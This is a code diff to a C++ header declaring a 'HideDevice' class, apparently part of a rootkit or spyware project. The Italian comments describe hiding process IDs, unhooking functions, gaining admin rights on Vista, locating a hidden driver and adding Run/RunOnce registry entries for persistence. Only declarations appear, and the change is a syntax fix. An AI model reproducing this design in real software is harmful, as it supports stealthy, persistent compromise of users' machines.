@@ -24,21 +24,21 @@ typedef struct registry_entry {
 class HideDevice
 {
 	public:
-	void HideDevice::unhook_close();		// Chiude il device di unhook
-	BOOL HideDevice::unhook_all(BOOL is_fixup);				// Unhooka tutte le funzioni hookate
-	BOOL HideDevice::unhook_func(char *func_name, BOOL is_fixup);	// Unhooka una funzione particolare
-	BOOL HideDevice::unhook_hidepid(DWORD PID, BOOL is_add);	// Aggiunge/toglie un pid alla lista di quelli da nascondere
-	BOOL HideDevice::unhook_getadmin();		// Su vista rende admin "figo" (non usare su XP)
-	BOOL HideDevice::unhook_isdrv(WCHAR *driver_name);		// Dice se c'e' il driver che gira
-	BOOL HideDevice::unhook_getpath(WCHAR *driver_name, WCHAR *driver_path, DWORD size);	// Torna il path del driver
-	BOOL HideDevice::unhook_isdev();						// Dice se c'e' il device di unhooking
-	BOOL HideDevice::unhook_regwriteW(WCHAR *value_name, WCHAR *value);	// Inserisce una chiave in Run/RunOnce
-	BOOL HideDevice::unhook_regdeleteW(WCHAR *value_name);				// Cancella una chiave da Run/RunOnce
-	BOOL HideDevice::unhook_regwriteA(char *value_name, char *value);	// Inserisce una chiave in Run/RunOnce
-	BOOL HideDevice::unhook_regdeleteA(char *value_name);				// Cancella una chiave da Run/RunOnce
-	BOOL HideDevice::unhook_uninstall();								// Rimuove il driver dal registry
-	BOOL HideDevice::df_thaw(WCHAR freezed, WCHAR *thawed);				// Monta un device "reale"
-	BOOL HideDevice::df_freeze();										// Smonta un device "reale"
+	void unhook_close();		// Chiude il device di unhook
+	BOOL unhook_all(BOOL is_fixup);				// Unhooka tutte le funzioni hookate
+	BOOL unhook_func(char *func_name, BOOL is_fixup);	// Unhooka una funzione particolare
+	BOOL unhook_hidepid(DWORD PID, BOOL is_add);	// Aggiunge/toglie un pid alla lista di quelli da nascondere
+	BOOL unhook_getadmin();		// Su vista rende admin "figo" (non usare su XP)
+	BOOL unhook_isdrv(WCHAR *driver_name);		// Dice se c'e' il driver che gira
+	BOOL unhook_getpath(WCHAR *driver_name, WCHAR *driver_path, DWORD size);	// Torna il path del driver
+	BOOL unhook_isdev();						// Dice se c'e' il device di unhooking
+	BOOL unhook_regwriteW(WCHAR *value_name, WCHAR *value);	// Inserisce una chiave in Run/RunOnce
+	BOOL unhook_regdeleteW(WCHAR *value_name);				// Cancella una chiave da Run/RunOnce
+	BOOL unhook_regwriteA(char *value_name, char *value);	// Inserisce una chiave in Run/RunOnce
+	BOOL unhook_regdeleteA(char *value_name);				// Cancella una chiave da Run/RunOnce
+	BOOL unhook_uninstall();								// Rimuove il driver dal registry
+	BOOL df_thaw(WCHAR freezed, WCHAR *thawed);				// Monta un device "reale"
+	BOOL df_freeze();										// Smonta un device "reale"
 
 
 	HideDevice(void);
